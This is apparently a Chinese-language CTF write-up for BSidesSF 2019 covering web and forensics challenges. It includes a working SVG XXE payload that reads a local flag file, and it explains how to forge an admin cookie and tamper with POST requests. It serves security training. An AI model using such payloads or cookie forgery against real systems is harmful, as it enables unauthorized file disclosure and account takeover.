# BSidesSF 2019 CTF WriteUp

[TOC]

## WEB-Pick Tac Toe

看源码，3*3格子表示如下：

| Ul   | u    | Ur   |
| ---- | ---- | ---- |
| l    | c    | r    |
| Bl   | b    | br   |

![Screen Shot 2019-03-05 at 10.27.23 PM](https://ws4.sinaimg.cn/large/006tKfTcgy1g0safy9d9mj30m002q751.jpg)

事实证明机器下过的位置可以覆盖

**Hackbar**

![Screen Shot 2019-03-05 at 10.29.20 PM](https://ws1.sinaimg.cn/large/006tKfTcgy1g0safx8drzj31620em0tr.jpg)

或

**Console**

![Screen Shot 2019-03-05 at 10.30.23 PM](https://ws1.sinaimg.cn/large/006tKfTcgy1g0sagwhg8uj30c206ymxg.jpg)

快点儿鼠标点击也行，服务器反应不过来

![Screen Shot 2019-03-05 at 11.37.33 AM](/Users/kevinluo/Desktop/Screen Shot 2019-03-05 at 11.37.33 AM.png)

flag：**CTF{i_beat_the_impossible}**

总结：post请求action参数在网址后添加,post的方式：burp、firefox hackbar、console（:""代替=）



## WEB-svgmagic

> https://ctftime.org/writeup/12064

svg文件写成这样：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE document [ <!ENTITY  data SYSTEM
  'file:./flag.txt'> ]>
<svg
   xmlns="http://www.w3.org/2000/svg"
   width="200mm"
   height="10mm">
   <text x="10" y="15" fill="red">//回显一下，将flag.txt转换以图片形式回显
      &data;
   </text>
</svg>
```

![Screen Shot 2019-03-05 at 11.51.58 AM](https://ws3.sinaimg.cn/large/006tKfTcgy1g0rs0u7ocwj308p01wq2r.jpg)

flag：**CTF{haha_no_imagemagick_sorry}**

## WEB-kookie

`We found the account cookie / monster`

Username:cookie

Password:monster

登录

![Screen Shot 2019-03-05 at 11.10.15 PM](https://ws1.sinaimg.cn/large/006tKfTcgy1g0sbmaoxy0j30h80amt97.jpg)

![Screen Shot 2019-03-05 at 11.11.02 PM](https://ws1.sinaimg.cn/large/006tKfTcgy1g0sbn6g3pxj31a60g0q5d.jpg)

因为要`Log in as admin!`，故![Screen Shot 2019-03-05 at 11.11.49 PM](https://ws3.sinaimg.cn/large/006tKfTcgy1g0sbnyh31ij30z202gglo.jpg)

改一下cookie。刷新页面，![Screen Shot 2019-03-05 at 11.12.24 PM](https://ws1.sinaimg.cn/large/006tKfTcgy1g0sbojueyfj31c602mgm3.jpg)

flag：**CTF{kookie_cookies}**



## WEB-futurella

签到水题。

![Screen Shot 2019-03-05 at 11.14.58 PM](https://ws1.sinaimg.cn/large/006tKfTcgy1g0sbra5vjrj30q402w3z7.jpg)



## Forensics-table-tennis

ICMP有点意思

![Screen Shot 2019-03-05 at 11.17.07 PM](https://ws4.sinaimg.cn/large/006tKfTcly1g0sbtlcqqzj308g036t8r.jpg)

有script。

...write(atob("Q1RGe0p1c3RBUzBuZ0FiMHV0UDFuZ1Awbmd9<"));...

base64解密函数		

> btoa和atob是window对象的两个函数，其中btoa是binary to ascii，用于将binary的数据用ascii码表示，即Base64的编码过程，而atob则是ascii to binary，用于将ascii码解析成binary数据，看一个例子：
>
> ```
> // Define the string
> var string = 'Hello World!';
> 
> // Encode the String
> var encodedString = btoa(string);
> console.log(encodedString); // Outputs: "SGVsbG8gV29ybGQh"
> 
> // Decode the String
> var decodedString = atob(encodedString);
> console.log(decodedString); // Outputs: "Hello World!"
> ```

console中输入：

`atob("Q1RGe0p1c3RBUzBuZ0FiMHV0UDFuZ1Awbmd9")`

得到`"CTF{JustAS0ngAb0utP1ngP0ng}"`



## Forensics-Zippy

wireshark载入，看数据，有`flag.zip`字样，里面套个`flag.txt`。还发现

`unzip -P supercomplexpassword flag.zip`

看来是解压密码。

直接十六进制打开，找504B0304（zip文件头），把文件头前面的Hex都删掉，另存为zip。输入解压密码，拿到flag：**CTF{this_flag_is_your_flag}**

